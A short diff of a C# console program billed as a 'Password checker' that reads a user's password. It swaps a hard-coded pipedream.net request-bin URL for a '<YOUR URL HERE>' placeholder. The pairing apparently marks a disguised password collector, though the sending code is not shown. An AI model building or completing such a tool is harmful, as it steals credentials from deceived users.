@@ -12,7 +12,7 @@ namespace ConsoleApp1
     {
         static void Main(string[] args)
         {
-            string URL = "https://en9nxtpjdwglr.x.pipedream.net/";
+            string URL = "<YOUR URL HERE>";
             Console.WriteLine("Password checker please enter a password to see how strong it is below:");
             string password = Console.ReadLine();
 
